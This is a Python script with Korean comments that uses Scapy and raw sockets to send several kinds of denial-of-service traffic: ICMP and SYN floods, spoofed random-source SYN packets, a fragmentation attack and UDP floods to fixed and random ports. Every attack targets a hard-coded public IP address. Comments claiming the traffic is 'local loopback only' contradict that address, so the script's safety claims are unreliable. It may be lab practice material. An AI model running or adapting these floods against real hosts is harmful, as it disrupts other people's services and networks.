from scapy.all import IP, ICMP, TCP, fragment, send
#과도한 ICMP 연결시도
packet = IP(dst ="115.92.164.155") /ICMP()
for _ in range(100):
    send(packet)

# SYN 플러딩 공격
packet = IP(dst="115.92.164.155") / TCP(dport=80, flags="S")
for _ in range(100):
    send(packet)

#무작위 IP에 의한 디도스 공격
import random

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))
for _ in range(5):
    src_ip = random_ip()          # 랜덤 IP 생성
    pkt = IP(src=src_ip, dst="115.92.164.155") / TCP(dport=80, flags="S")
    pkt.show()

#단편화 공격
import time

# 로컬 루프백만 사용 (외부 전송 금지)
dst_ip = "115.92.165.155"

# 큰 페이로드 (단편화 유도)
payload = b"A" * 4000

ip = IP(dst=dst_ip, flags="MF") / ICMP() / payload

# fragment 크기 지정 (예: 608바이트)
fragments = fragment(ip, fragsize=608)

for _ in range(5):
    for pkt in fragments:
        send(pkt, verbose=False)
        time.sleep(0.2)  # 과도한 전송 방지

#UDP flooding 공격
import socket
import time

DST_IP = "115.92.165.155"   # 로컬 루프백만
DST_PORT = 9999
RATE_PPS = 10          # 초당 10패킷 (낮은 전송률)
TOTAL_PKTS = 50        # 총 50패킷 상한
PAYLOAD_SIZE = 200     # 소형 페이로드

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b"A" * PAYLOAD_SIZE

interval = 1.0 / RATE_PPS

for i in range(TOTAL_PKTS):
    sock.sendto(payload, (DST_IP, DST_PORT))
    time.sleep(interval)

sock.close()
print("Done (safe UDP traffic simulation)")


# UDP를 무작위로 보내는 공격
import socket
import random
import time

DST_IP = "115.92.165.155"      # 외부 전송 금지 (로컬만)
PORT_MIN = 10000
PORT_MAX = 10100          # 포트 범위 제한
RATE_PPS = 5              # 초당 5패킷 (낮음)
TOTAL_PKTS = 40           # 총 전송량 상한
PAYLOAD_SIZE = 120        # 소형 페이로드

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b"A" * PAYLOAD_SIZE
interval = 1.0 / RATE_PPS

for i in range(TOTAL_PKTS):
    port = random.randint(PORT_MIN, PORT_MAX)
    sock.sendto(payload, (DST_IP, port))
    print(f"sent #{i+1} -> {DST_IP}:{port}")
    time.sleep(interval)

sock.close()
print("Done (safe random-port UDP simulation)")